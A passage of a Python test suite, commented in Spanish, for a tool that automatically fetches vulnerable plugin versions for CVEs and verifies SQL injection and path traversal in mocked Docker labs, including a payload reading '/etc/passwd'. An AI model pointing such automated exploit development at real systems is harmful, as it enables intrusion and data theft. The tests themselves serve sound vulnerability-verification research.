    assert _clean_affected_version("2.1.3-2.8.2") == "2.8.2"
    assert _clean_affected_version("1.0-2.0") == "2.0"
    # un unico token con sufijo no numerico tras el guion sigue sin tocarse (no es un rango)
    assert _clean_affected_version("1.0-beta1") == "1.0-beta1"


def test_clean_affected_version_handles_dashless_lt_and_v_prefix():
    # bug real confirmado en vivo (CVE-2024-3552): 'affected_version': '<1.7.0' SIN espacio
    # entre '<' y el numero no hacia match con el patron de rango (exigia \s+ tras el simbolo) --
    # se descargaba la version MAS RECIENTE del plugin en WordPress.org (ya parcheada) en vez de
    # la vulnerable, y por eso la inyeccion SQL nunca se confirmaba contra codigo arreglado.
    from binoracle.workflows.cve_agent import _clean_affected_version
    assert _clean_affected_version("<1.7.0") == "1.7.0"
    assert _clean_affected_version("<=1.7.0") == "1.7.0"
    # el prefijo 'v'/'V' (comun en tags de git/PoC aunque NVD no lo use) tambien se limpia, con
    # o sin frase de rango alrededor
    assert _clean_affected_version("v1.7.0") == "1.7.0"
    assert _clean_affected_version("V1.7.0") == "1.7.0"
    assert _clean_affected_version("before v1.7.0") == "1.7.0"
    assert _clean_affected_version("<v1.7.0") == "1.7.0"


def test_affected_version_is_exclusive_distinguishes_before_from_through():
    # bug real confirmado en vivo, CVE-2024-3552: 'affected_version': '<1.7.0' es un limite
    # EXCLUSIVO (1.7.0 ya esta parcheada, la vulnerable es la ultima publicada ANTES de esa) --
    # pero _clean_affected_version solo devuelve el numero limpio, sin decir si el limite
    # original era exclusivo o inclusivo. Sin saberlo, se descargaba 1.7.0 tal cual (el fix) en
    # vez de la version realmente vulnerable, y la verificacion dinamica nunca podia confirmar
    # nada contra codigo ya arreglado.
    from binoracle.workflows.cve_agent import _affected_version_is_exclusive
    assert _affected_version_is_exclusive("<1.7.0") is True
    assert _affected_version_is_exclusive("before 1.7.0") is True
    assert _affected_version_is_exclusive("prior to 1.7.0") is True
    # inclusivos: la version citada SI es la vulnerable, se descarga tal cual
    assert _affected_version_is_exclusive("<=1.7.0") is False
    assert _affected_version_is_exclusive("through 1.7.0") is False
    assert _affected_version_is_exclusive("up to and including 1.7.0") is False
    assert _affected_version_is_exclusive("1.0.0") is False
    assert _affected_version_is_exclusive("") is False


def test_version_sort_key_orders_numerically_not_lexicographically():
    from binoracle.workflows.websource import _version_sort_key
    versions = ["1.6.9", "1.7.0", "1.10.0", "1.9.0", "1.6.8"]
    assert sorted(versions, key=_version_sort_key) == [
        "1.6.8", "1.6.9", "1.7.0", "1.9.0", "1.10.0"]


def test_fetch_wordpress_plugin_picks_prior_version_for_exclusive_bound(monkeypatch):
    # bug real confirmado en vivo, CVE-2024-3552: con exclusive_upper_bound=True y version
    # '1.7.0' (el limite citado, YA parcheado), se debe descargar la ultima version REAL
    # publicada antes de esa ('1.6.9' aqui), no 1.7.0 tal cual.
    import json as _json
    import binoracle.workflows.websource as ws

    class _FakeResp:
        def __init__(self, data):
            self._data = data
        def read(self, n):
            return _json.dumps(self._data).encode()
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False

    monkeypatch.setattr(ws, "_urlopen", lambda url, timeout=60.0: _FakeResp({
        "versions": {"1.6.8": "http://x/1.6.8.zip", "1.6.9": "http://x/1.6.9.zip",
                    "1.7.0": "http://x/1.7.0.zip", "trunk": "http://x/trunk.zip"},
        "download_link": "http://x/latest.zip", "version": "1.7.0"}))

    captured = {}
    def fake_download(slug, url, resolved_version, dest_dir, step, timeout, res):
        captured["url"] = url
        res.ok = True
        res.resolved_version = resolved_version
        return res
    monkeypatch.setattr(ws, "_download_wp_zip", fake_download)

    r = ws.fetch_wordpress_plugin("web-directory-free", version="1.7.0",
                                  exclusive_upper_bound=True)
    assert r.resolved_version == "1.6.9"
    assert captured["url"] == "http://x/1.6.9.zip"


def test_fetch_wordpress_plugin_uses_bound_itself_when_no_prior_version_exists(monkeypatch):
    import json as _json
    import binoracle.workflows.websource as ws

    class _FakeResp:
        def __init__(self, data):
            self._data = data
        def read(self, n):
            return _json.dumps(self._data).encode()
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False

    monkeypatch.setattr(ws, "_urlopen", lambda url, timeout=60.0: _FakeResp({
        "versions": {"1.0.0": "http://x/1.0.0.zip"},
        "download_link": "http://x/latest.zip", "version": "1.0.0"}))
    monkeypatch.setattr(ws, "_download_wp_zip", lambda slug, url, resolved_version, dest_dir,
                        step, timeout, res: (res.__setattr__("ok", True),
                                             res.__setattr__("resolved_version", resolved_version),
                                             res)[-1])

    r = ws.fetch_wordpress_plugin("some-plugin", version="1.0.0", exclusive_upper_bound=True)
    assert r.resolved_version == "1.0.0"   # no hay version anterior -- se usa el limite igual


def test_fetch_drupal_module_picks_prior_release_for_exclusive_bound(monkeypatch):
    # mismo mecanismo que fetch_wordpress_plugin (ver test_fetch_wordpress_plugin_picks_
    # prior_version_for_exclusive_bound), ahora implementado tambien para Drupal.org: con
    # exclusive_upper_bound=True y version '8.x-1.7' (el limite citado, YA parcheado), debe
    # descargar la ultima release REAL publicada antes de esa ('8.x-1.6' aqui), no 8.x-1.7 tal cual.
    import binoracle.workflows.websource as ws

    xml = b"""<?xml version="1.0" encoding="utf-8"?>
<project>
  <releases>
    <release>
      <version>8.x-1.7</version>
      <status>published</status>
      <download_link>http://x/8.x-1.7.tar.gz</download_link>
    </release>
    <release>
      <version>8.x-1.6</version>
      <status>published</status>
      <download_link>http://x/8.x-1.6.tar.gz</download_link>
    </release>
    <release>
      <version>8.x-1.5</version>
      <status>published</status>
      <download_link>http://x/8.x-1.5.tar.gz</download_link>
    </release>
  </releases>
</project>"""

    class _FakeResp:
        def read(self, n):
            return xml
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False
    monkeypatch.setattr(ws, "_urlopen", lambda url, timeout=60.0: _FakeResp())
    monkeypatch.setattr(ws, "_cache_path_for", lambda *a, **kw: None)

    captured = {}
    def fake_urlopen_download(url, timeout=60.0):
        captured["download_url"] = url
        class _R:
            def read(self, n):
                return b""
            def __enter__(self):
                return self
            def __exit__(self, *a):
                return False
        return _R()
    # la propia descarga del tar.gz reusa _urlopen -- segunda llamada, distinta URL
    calls = []
    def fake_urlopen(url, timeout=60.0):
        calls.append(url)
        if url == ws._DRUPAL_UPDATE_XML.format(project="some_module"):
            return _FakeResp()
        return fake_urlopen_download(url, timeout)
    monkeypatch.setattr(ws, "_urlopen", fake_urlopen)
    monkeypatch.setattr("tarfile.is_tarfile", lambda p: False)

    r = ws.fetch_drupal_module("some_module", version="8.x-1.7", exclusive_upper_bound=True)
    assert r.resolved_version == "8.x-1.6"
    assert captured.get("download_url") == "http://x/8.x-1.6.tar.gz"


def test_fetch_drupal_module_uses_bound_itself_when_no_prior_release_exists(monkeypatch):
    import binoracle.workflows.websource as ws

    xml = b"""<?xml version="1.0" encoding="utf-8"?>
<project>
  <releases>
    <release>
      <version>8.x-1.0</version>
      <status>published</status>
      <download_link>http://x/8.x-1.0.tar.gz</download_link>
    </release>
  </releases>
</project>"""

    class _FakeResp:
        def read(self, n):
            return xml
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False
    captured = {}
    def fake_urlopen(url, timeout=60.0):
        if url == ws._DRUPAL_UPDATE_XML.format(project="some_module"):
            return _FakeResp()
        captured["download_url"] = url
        class _R:
            def read(self, n):
                return b""
            def __enter__(self):
                return self
            def __exit__(self, *a):
                return False
        return _R()
    monkeypatch.setattr(ws, "_urlopen", fake_urlopen)
    monkeypatch.setattr(ws, "_cache_path_for", lambda *a, **kw: None)
    monkeypatch.setattr("tarfile.is_tarfile", lambda p: False)

    r = ws.fetch_drupal_module("some_module", version="8.x-1.0", exclusive_upper_bound=True)
    assert r.resolved_version == "8.x-1.0"   # no hay release anterior -- se usa el limite igual
    assert captured.get("download_url") == "http://x/8.x-1.0.tar.gz"


def test_investigate_cves_batch_runs_concurrently_and_isolates_errors(monkeypatch):
    # confirma que investigate_cves_batch de verdad solapa el trabajo (no lo serializa) y que una
    # CVE fallando con una excepcion no tumba el resto del lote -- se queda en su propio
    # BatchItem.error.
    import threading
    import time as _time
    from binoracle.workflows import cve_agent

    concurrent_now = {"n": 0, "max": 0}
    lock = threading.Lock()

    def fake_investigate_cve(cve_id, binary="", config=None, llm=None, on_step=None, lang="es",
                             budget_s=300.0, hints=None, use_cache=True):
        with lock:
            concurrent_now["n"] += 1
            concurrent_now["max"] = max(concurrent_now["max"], concurrent_now["n"])
        if on_step:
            on_step(f"trabajando en {cve_id}")
        _time.sleep(0.1)
        with lock:
            concurrent_now["n"] -= 1
        if cve_id == "CVE-2099-0002":
            raise RuntimeError("fallo simulado de red")
        inv = cve_agent.Investigation(cve_id=cve_id)
        inv.verified = (cve_id == "CVE-2099-0001")
        inv.vuln_class = "sqli"
        inv.lookup_ok = True
        return inv

    monkeypatch.setattr(cve_agent, "investigate_cve", fake_investigate_cve)

    events = []
    items = cve_agent.investigate_cves_batch(
        ["CVE-2099-0001", "CVE-2099-0002", "CVE-2099-0003"], parallel=3,
        on_event=events.append)

    assert concurrent_now["max"] >= 2   # de verdad se solaparon, no una tras otra

    by_id = {it.cve_id: it for it in items}
    assert by_id["CVE-2099-0001"].status == "done"
    assert by_id["CVE-2099-0001"].investigation.verified is True
    assert by_id["CVE-2099-0002"].status == "error"
    assert "fallo simulado de red" in by_id["CVE-2099-0002"].error
    assert by_id["CVE-2099-0003"].status == "done"
    assert by_id["CVE-2099-0003"].investigation.verified is False

    step_events = [e for e in events if e["type"] == "step"]
    assert any("trabajando en CVE-2099-0001" in e["message"] for e in step_events)
    finish_events = {e["cve_id"]: e for e in events if e["type"] == "finish"}
    assert finish_events["CVE-2099-0002"]["status"] == "error"
    assert finish_events["CVE-2099-0001"]["status"] == "done"


def test_investigate_cves_batch_clamps_parallel_to_hard_cap(monkeypatch):
    # cada investigacion puede levantar su propio laboratorio Docker -- parallel no debe poder
    # dispararse sin limite aunque se pida uno absurdo.
    import threading
    import time as _time
    from binoracle.workflows import cve_agent

    concurrent_now = {"n": 0, "max": 0}
    lock = threading.Lock()

    def fake_investigate_cve(cve_id, binary="", config=None, llm=None, on_step=None, lang="es",
                             budget_s=300.0, hints=None):
        with lock:
            concurrent_now["n"] += 1
            concurrent_now["max"] = max(concurrent_now["max"], concurrent_now["n"])
        _time.sleep(0.05)
        with lock:
            concurrent_now["n"] -= 1
        return cve_agent.Investigation(cve_id=cve_id, lookup_ok=True)

    monkeypatch.setattr(cve_agent, "investigate_cve", fake_investigate_cve)
    cve_ids = [f"CVE-2099-{i:04d}" for i in range(10)]
    cve_agent.investigate_cves_batch(cve_ids, parallel=100)
    assert concurrent_now["max"] <= cve_agent._BATCH_MAX_PARALLEL


def test_render_batch_summary_counts_verified_and_errors_and_escapes_pipes():
    from binoracle.workflows.cve_agent import BatchItem, Investigation, render_batch_summary

    verified_inv = Investigation(cve_id="CVE-2099-0001", verified=True, vuln_class="sqli",
                                 lookup_ok=True, is_gap=False)
    not_verified_inv = Investigation(cve_id="CVE-2099-0002", verified=False, vuln_class="xss",
                                     lookup_ok=True, is_gap=True)
    items = [
        BatchItem(cve_id="CVE-2099-0001", status="done", investigation=verified_inv, elapsed_s=12.3),
        BatchItem(cve_id="CVE-2099-0002", status="done", investigation=not_verified_inv, elapsed_s=5.0),
        BatchItem(cve_id="CVE-2099-0003", status="error", error="Boom | with a pipe char", elapsed_s=1.0),
    ]
    out = render_batch_summary(items, lang="es")
    assert "1/3 verificadas" in out
    assert "1 con error" in out
    assert "CVE-2099-0001" in out and "CVE-2099-0002" in out and "CVE-2099-0003" in out
    assert "Boom / with a pipe char" in out   # el '|' se escapo, si no rompe la tabla markdown


def test_cmd_investigate_batch_writes_reports_and_prints_summary(monkeypatch, tmp_path, capsys):
    import binoracle.cli as cli
    from binoracle.workflows import cve_agent

    def fake_batch(cve_ids, config=None, lang="es", budget_s=300.0, parallel=2,
                  hints_by_cve=None, on_event=None, use_cache=True):
        items = []
        for cid in cve_ids:
            if on_event:
                on_event({"cve_id": cid, "type": "start"})
                on_event({"cve_id": cid, "type": "step", "message": "paso de prueba"})
            inv = cve_agent.Investigation(cve_id=cid, lookup_ok=True, vuln_class="sqli",
                                          verified=(cid == "CVE-2099-0001"))
            item = cve_agent.BatchItem(cve_id=cid, status="done", investigation=inv, elapsed_s=1.0)
            if on_event:
                on_event({"cve_id": cid, "type": "finish", "status": "done", "elapsed_s": 1.0,
                         "error": ""})
            items.append(item)
        return items

    monkeypatch.setattr(cve_agent, "investigate_cves_batch", fake_batch)

    parser = cli.build_parser()
    out_dir = tmp_path / "reports"
    args = parser.parse_args(["investigate-batch", "CVE-2099-0001", "CVE-2099-0002",
                              "--out-dir", str(out_dir), "--parallel", "2"])
    config = cli.load_config()
    args.func(args, config)

    assert (out_dir / "CVE-2099-0001.md").exists()
    assert (out_dir / "CVE-2099-0002.md").exists()
    # evidencia completa sin recortar junto al markdown -- mismo motivo que --json en
    # 'investigate' (el renderizado siempre trunca los cuerpos de respuesta reales).
    import json as _json
    dumped = _json.loads((out_dir / "CVE-2099-0001.json").read_text())
    assert dumped["cve_id"] == "CVE-2099-0001"
    assert dumped["verified"] is True
    captured = capsys.readouterr()
    assert "paso de prueba" in captured.out
    assert "Resumen del lote" in captured.out
    assert "1/2 verificadas" in captured.out


def test_cvefeed_parses_telegram_preview_html_and_decodes_entities(monkeypatch):
    from binoracle.workflows import cvefeed

    fake_html = (
        '<div class="tgme_widget_message_wrap">'
        '<div class="tgme_widget_message" data-post="CVENotify/100">'
        '<div class="tgme_widget_message_text js-message_text" dir="auto">'
        'CVE-2024-1111 published, no PoC yet.<br/>Check it out</div></div></div>'
        '<div class="tgme_widget_message_wrap">'
        '<div class="tgme_widget_message" data-post="CVENotify/101">'
        '<div class="tgme_widget_message_text js-message_text" dir="auto">'
        'New WordPress plugin flaw CVE-2024-2222 &amp; CVE-2024-2223 &mdash; SQLi</div></div></div>')
    monkeypatch.setattr(cvefeed, "_fetch_preview_html", lambda channel, timeout=20.0: fake_html)

    msgs = cvefeed.fetch_channel_messages("CVENotify")
    assert [m.post_id for m in msgs] == [100, 101]
    assert msgs[0].text == "CVE-2024-1111 published, no PoC yet.\nCheck it out"
    assert "&amp;" not in msgs[1].text and "&" in msgs[1].text


def test_cvefeed_fetch_channel_messages_never_raises_on_network_failure(monkeypatch):
    from binoracle.workflows import cvefeed

    def boom(channel, timeout=20.0):
        raise OSError("name resolution failed")
    monkeypatch.setattr(cvefeed, "_fetch_preview_html", boom)
    assert cvefeed.fetch_channel_messages("CVENotify") == []


def test_cvefeed_looks_cms_related():
    from binoracle.workflows.cvefeed import looks_cms_related
    assert looks_cms_related("The Foo WordPress plugin before 1.0 is vulnerable") is True
    assert looks_cms_related("A Drupal module has an IDOR") is True
    assert looks_cms_related("Buffer overflow in some embedded router firmware") is False


def test_cvefeed_poll_new_cve_mentions_only_returns_new_ones_and_dedupes(monkeypatch, tmp_path):
    from binoracle.workflows import cvefeed

    monkeypatch.setattr(cvefeed, "_STATE_DIR", str(tmp_path))

    first_batch = [
        cvefeed.TelegramMessage(post_id=1, text="CVE-2024-0001 WordPress plugin SQLi"),
        cvefeed.TelegramMessage(post_id=2, text="CVE-2024-0002 and also CVE-2024-0002 again"),
    ]
    monkeypatch.setattr(cvefeed, "fetch_channel_messages", lambda channel, timeout=20.0: first_batch)

    mentions = cvefeed.poll_new_cve_mentions("CVENotify")
    assert sorted(m.cve_id for m in mentions) == ["CVE-2024-0001", "CVE-2024-0002"]
    assert next(m for m in mentions if m.cve_id == "CVE-2024-0001").cms_related is True

    # segundo sondeo sin mensajes nuevos: no debe repetir nada ya visto
    assert cvefeed.poll_new_cve_mentions("CVENotify") == []

    # un tercer mensaje de verdad nuevo SI debe aparecer
    second_batch = first_batch + [
        cvefeed.TelegramMessage(post_id=3, text="CVE-2024-0003 unrelated router firmware bug")]
    monkeypatch.setattr(cvefeed, "fetch_channel_messages", lambda channel, timeout=20.0: second_batch)
    mentions2 = cvefeed.poll_new_cve_mentions("CVENotify")
    assert [m.cve_id for m in mentions2] == ["CVE-2024-0003"]
    assert mentions2[0].cms_related is False


def test_colorlog_classify_prioritizes_error_then_warn_then_ok():
    from binoracle import colorlog
    assert colorlog.classify("fallo al conectar con Burp") == "error"
    assert colorlog.classify("verificacion dinamica intentada pero no confirmada") == "warn"
    assert colorlog.classify("cuenta objetivo VERIFICADA con un segundo login") == "ok"
    assert colorlog.classify("descargando el plugin...") == "info"


def test_colorlog_disables_color_when_not_a_tty(capsys):
    from binoracle import colorlog
    colorlog.info("hola")
    out = capsys.readouterr().out
    assert "\033[" not in out
    assert "[INFO] hola" in out


def test_cmd_investigate_watch_is_generic_by_default_and_processes_non_cms_too(
        monkeypatch, tmp_path):
    # por defecto investigate-watch es GENERICO: una CVE sin pinta de CMS tambien se investiga
    # (hipotesis + PoC desarrollado), aunque no pueda llegar a VERIFICADO automaticamente -- ese
    # desarrollo de exploit es el objetivo del comando, no solo los casos con lab Docker.
    import binoracle.cli as cli
    from binoracle.workflows import cve_agent, cvefeed

    mentions = [
        cvefeed.CVEMention(cve_id="CVE-2099-0001", post_id=1, text="WordPress plugin",
                           cms_related=True),
        cvefeed.CVEMention(cve_id="CVE-2099-0002", post_id=2, text="router firmware",
                           cms_related=False),
    ]
    monkeypatch.setattr(cvefeed, "poll_new_cve_mentions", lambda channel: mentions)

    captured_cve_ids = {}

    def fake_batch(cve_ids, config=None, lang="es", budget_s=300.0, parallel=2,
                  hints_by_cve=None, on_event=None, use_cache=True):
        captured_cve_ids["ids"] = list(cve_ids)
        items = []
        for cid in cve_ids:
            inv = cve_agent.Investigation(cve_id=cid, lookup_ok=True, vuln_class="sqli")
            items.append(cve_agent.BatchItem(cve_id=cid, status="done", investigation=inv,
                                             elapsed_s=1.0))
        return items
    monkeypatch.setattr(cve_agent, "investigate_cves_batch", fake_batch)

    parser = cli.build_parser()
    out_dir = tmp_path / "watch_reports"
    args = parser.parse_args(["investigate-watch", "--out-dir", str(out_dir), "--once"])
    config = cli.load_config()
    args.func(args, config)

    assert sorted(captured_cve_ids["ids"]) == ["CVE-2099-0001", "CVE-2099-0002"]
    assert (out_dir / "CVE-2099-0001.md").exists()
    assert (out_dir / "CVE-2099-0002.md").exists()


def test_cmd_investigate_watch_cms_only_flag_filters_the_rest(monkeypatch, tmp_path, capsys):
    import binoracle.cli as cli
    from binoracle.workflows import cve_agent, cvefeed

    mentions = [
        cvefeed.CVEMention(cve_id="CVE-2099-0003", post_id=1, text="router firmware",
                           cms_related=False),
        cvefeed.CVEMention(cve_id="CVE-2099-0004", post_id=2, text="WordPress plugin",
                           cms_related=True),
    ]
    monkeypatch.setattr(cvefeed, "poll_new_cve_mentions", lambda channel: mentions)

    captured_cve_ids = {}

    def fake_batch(cve_ids, config=None, lang="es", budget_s=300.0, parallel=2,
                  hints_by_cve=None, on_event=None, use_cache=True):
        captured_cve_ids["ids"] = list(cve_ids)
        items = []
        for cid in cve_ids:
            inv = cve_agent.Investigation(cve_id=cid, lookup_ok=True, vuln_class="other")
            items.append(cve_agent.BatchItem(cve_id=cid, status="done", investigation=inv,
                                             elapsed_s=1.0))
        return items
    monkeypatch.setattr(cve_agent, "investigate_cves_batch", fake_batch)

    parser = cli.build_parser()
    out_dir = tmp_path / "watch_reports_cms_only"
    args = parser.parse_args(["investigate-watch", "--out-dir", str(out_dir), "--once",
                              "--cms-only"])
    config = cli.load_config()
    args.func(args, config)

    assert captured_cve_ids["ids"] == ["CVE-2099-0004"]
    out = capsys.readouterr().out
    assert "CVE-2099-0003" in out   # se menciona como ignorada, aunque no se investigue


def test_cmd_investigate_watch_no_mentions_does_not_call_batch(monkeypatch, tmp_path):
    import binoracle.cli as cli
    from binoracle.workflows import cve_agent, cvefeed

    monkeypatch.setattr(cvefeed, "poll_new_cve_mentions", lambda channel: [])
    called = {"n": 0}
    monkeypatch.setattr(cve_agent, "investigate_cves_batch",
                        lambda *a, **k: called.__setitem__("n", called["n"] + 1))

    parser = cli.build_parser()
    out_dir = tmp_path / "watch_reports_empty"
    args = parser.parse_args(["investigate-watch", "--out-dir", str(out_dir), "--once"])
    config = cli.load_config()
    args.func(args, config)

    assert called["n"] == 0


def test_fetch_git_source_disables_interactive_credential_prompt(monkeypatch):
    # bug real confirmado en vivo (CVE-2025-9501): un source_url que no es un repo real/publico
    # (una URL de GitHub inventada por el LLM, o un mirror distinto del oficial) hacia que git se
    # quedara colgado pidiendo usuario/contrasena por el terminal en vez de fallar al momento --
    # sin GIT_TERMINAL_PROMPT=0, el proceso esperaba hasta agotar el timeout entero (90s) sin
    # hacer nada util.
    import binoracle.workflows.websource as websource

    captured = {}
    class _FakeCompletedProcess:
        returncode = 0
        stdout = ""
        stderr = ""
    def fake_run(cmd, capture_output=True, text=True, timeout=90.0, env=None):
        captured["env"] = env
        return _FakeCompletedProcess()
    monkeypatch.setattr(websource.subprocess, "run", fake_run)
    monkeypatch.setattr(websource.shutil, "which", lambda name: "/usr/bin/git")

    websource.fetch_git_source("https://github.com/someorg/somerepo")
    assert captured["env"] is not None
    assert captured["env"].get("GIT_TERMINAL_PROMPT") == "0"


def test_run_web_investigation_falls_back_to_guessed_slug_when_llm_source_url_fails(monkeypatch):
    # bug real confirmado en vivo (CVE-2025-9501, CVE-2024-3552): el LLM dio un source_url que NO
    # es un repo/slug real (una URL de GitHub inventada) y fetch_source() fallo descargandolo --
    # el slug real SOLO se probaba cuando el LLM no daba NINGUN source_url, nunca cuando daba uno
    # que resultaba inservible, asi que el codigo real se daba por perdido aunque SI se pudiera
    # haber obtenido por el slug deducido de la propia descripcion del aviso.
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource

    calls = []
    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        calls.append(target)
        if target == "web-directory-free":
            return websource.SourceFetchResult(ok=True, kind="wordpress-plugin", source=target,
                                               local_path="/tmp/fake", plugin_dir="web-directory-free")
        return websource.SourceFetchResult(ok=False, note="git clone fallo: repository not found")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    inv = Investigation(cve_id="CVE-2024-3552")
    inv.vuln_class = "sqli"
    inv.description = ("The Web Directory Free WordPress plugin before 1.7.0 does not sanitise "
                       "and escape a parameter before using it in a SQL statement via an AJAX "
                       "action available to unauthenticated users.")
    inv.llm_notes = {
        "source_url": "https://github.com/WordPress/plugins/tree/master/web-directory-free",
        "endpoint": "/wp-admin/admin-ajax.php?action=search_directory", "http_method": "POST",
        "parameters": ["query"], "vulnerable_functions": [],
    }
    _run_web_investigation(inv, lang="es", step=lambda m: None)

    assert calls == ["https://github.com/WordPress/plugins/tree/master/web-directory-free",
                     "web-directory-free"]
    assert inv.source_fetch["ok"] is True
    assert inv.source_fetch["source_guessed_from_description"] is True


def test_run_web_investigation_does_not_retry_when_guess_matches_given_source(monkeypatch):
    # si el source_url que dio el LLM YA ES el slug deducido (o no hay nada que deducir), no debe
    # haber una segunda llamada inutil a fetch_source().
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource

    calls = []
    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        calls.append(target)
        return websource.SourceFetchResult(ok=False, note="404")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    inv = Investigation(cve_id="CVE-2024-9999")
    inv.vuln_class = "sqli"
    inv.description = "Generic text with no plugin name pattern."
    inv.llm_notes = {"source_url": "some-plugin-slug", "endpoint": "/x", "http_method": "POST",
                     "parameters": ["q"], "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)

    assert calls == ["some-plugin-slug"]   # sin reintento, no habia nada que deducir


def test_extract_followable_urls_parses_copy_then_serve_json():
    # bug real confirmado en vivo (CVE-2024-50508, Woocommerce Product Design): el endpoint
    # vulnerable no refleja el contenido en la MISMA respuesta -- copia el fichero objetivo a una
    # ruta publica nueva y devuelve {"url": "...", "path": "...", "status": "success"} en vez del
    # contenido. Sin seguir esa URL, el secreto plantado nunca aparece aunque el traversal sea
    # real.
    from binoracle.workflows.wpverify import _extract_followable_urls
    text = ('{"path": "/var/www/html/wp-content/uploads/wcpc/images/uploaded_images/x.txt", '
           '"message": "Image Uploaded Successfully", '
           '"url": "http://lab.invalid/wp-content/uploads/wcpc/images/uploaded_images/x.txt", '
           '"status": "success"}')
    assert (_extract_followable_urls(text) ==
           ["http://lab.invalid/wp-content/uploads/wcpc/images/uploaded_images/x.txt"])


def test_extract_followable_urls_returns_empty_for_non_json_or_no_url():
    from binoracle.workflows.wpverify import _extract_followable_urls
    assert _extract_followable_urls("not json") == []
    assert _extract_followable_urls('{"status": "ok"}') == []
    assert _extract_followable_urls('{"url": "not-a-url"}') == []
    assert _extract_followable_urls("") == []
    assert _extract_followable_urls(None) == []
    assert _extract_followable_urls("[1, 2, 3]") == []   # JSON valido, pero no un dict


def test_extract_followable_urls_parses_html_img_and_a_tags():
    # generalizacion (mejora #4): algunos manejadores devuelven una pagina de confirmacion HTML
    # en vez de JSON -- un <img src=...>/<a href=...> apuntando a donde quedo la copia.
    from binoracle.workflows.wpverify import _extract_followable_urls
    html = ('<html><body><p>Uploaded!</p>'
           '<img src="http://lab.invalid/wp-content/uploads/leaked.txt">'
           '<a href="/wp-content/uploads/other-leaked.txt">download</a>'
           '</body></html>')
    urls = _extract_followable_urls(html, base_url="http://lab.invalid")
    assert "http://lab.invalid/wp-content/uploads/leaked.txt" in urls
    assert "http://lab.invalid/wp-content/uploads/other-leaked.txt" in urls


def test_extract_followable_urls_caps_html_candidates():
    # una pagina HTML normal trae decenas de src/href de CSS/JS/iconos -- no debe intentar
    # seguir todas y cada una (dispararia muchisimas peticiones extra por cada intento de payload).
    from binoracle.workflows.wpverify import _extract_followable_urls
    html = "".join(f'<img src="http://lab.invalid/img{i}.png">' for i in range(30))
    assert len(_extract_followable_urls(html, base_url="http://lab.invalid")) <= 10


def test_verify_wordpress_path_traversal_follows_copy_then_serve_url(monkeypatch):
    # end-to-end (con el laboratorio Docker mockeado): confirma que verify_wordpress_path_traversal
    # de verdad SIGUE la URL que el endpoint devuelve cuando el secreto no esta en la respuesta
    # directa, y lo encuentra ahi -- reproduciendo el bug real de CVE-2024-50508.
    import json as _json
    import secrets as _real_secrets
    import binoracle.workflows.wpverify as wpverify

    class _FakeResp:
        def __init__(self, status_code, text):
            self.status_code = status_code
            self.text = text

    class _FakeLab:
        def write_canary(self, path, secret):
            return True

    class _FakeSession:
        def __init__(self):
            self.secret = None
        def request(self, method, url, **kw):
            if method == "GET" and url == "http://lab.invalid/leaked.txt":
                return _FakeResp(200, self.secret)
            return _FakeResp(200, _json.dumps({
                "path": "/var/www/html/wp-content/uploads/leaked.txt",
                "url": "http://lab.invalid/leaked.txt", "status": "success"}))

    fake_sess = _FakeSession()
    fake_boot = wpverify._LabSession(
        lab=_FakeLab(), base_url="http://lab.invalid", admin_id="1", admin_user="a",
        admin_pass="b", sub_user="s", sub_pass="p", sub_sess=fake_sess, admin_sess=None,
        shots=[], capture=lambda *a, **k: None)
    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)

    original_token_hex = _real_secrets.token_hex
    def fake_token_hex(n):
        s = original_token_hex(n)
        if n == 16:
            fake_sess.secret = s
        return s
    monkeypatch.setattr(wpverify.secrets, "token_hex", fake_token_hex)

    res = wpverify.verify_wordpress_path_traversal(
        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=pc_added_uploaded_image",
        "POST", {"file[path]": "/etc/passwd"}, path_param_hint="file[path]")

    assert res.verified is True
    assert res.evidence.get("url_seguida") == "http://lab.invalid/leaked.txt"
    assert fake_sess.secret in res.evidence.get("respuesta_cuerpo_recorte", "")


def test_verify_wordpress_path_traversal_surfaces_real_response_body_on_negative(monkeypatch):
    # bug real confirmado en vivo, CVE-2024-50508: cuando ninguna de las 40 variantes confirma
    # el secreto, el informe solo decia "no se confirmo", sin mas pistas -- forzando a bajar el
    # codigo del plugin a mano para diagnosticar (resulto ser que el handler no valida NADA, asi
    # que el negativo era casi con toda seguridad un problema de permisos del fichero canario,
    # no del payload). Ahora el cuerpo real de la respuesta del servidor va en la evidencia de
    # CADA intento, y un recorte del primero se cuela en el propio mensaje de bloqueo.
    import binoracle.workflows.wpverify as wpverify

    class _FakeLab:
        def write_canary(self, path, secret):
            return True

    class _FakeSession:
        def request(self, method, url, **kw):
            class _R:
                status_code = 200
                text = '{"status":"error","message":"File is not moved. Please try again."}'
            return _R()

    fake_boot = wpverify._LabSession(
        lab=_FakeLab(), base_url="http://lab.invalid", admin_id="1", admin_user="a",
        admin_pass="b", sub_user="s", sub_pass="p", sub_sess=_FakeSession(), admin_sess=None,
        shots=[], capture=lambda *a, **k: None)
    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)

    res = wpverify.verify_wordpress_path_traversal(
        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=pc_added_uploaded_image",
        "POST", {"file[path]": "/etc/passwd"}, path_param_hint="file[path]")

    assert res.verified is False
    assert "File is not moved" in res.detail
    assert all("respuesta_cuerpo_recorte" in t for t in res.evidence["intentos"])


def test_verify_wordpress_sqli_surfaces_real_response_body_on_negative(monkeypatch):
    # bug real confirmado en vivo, CVE-2024-3552: ninguna de las ~390 peticiones (error-based,
    # UNION, boolean-blind, time-based) contra el sink real y confirmado (level_filter_where /
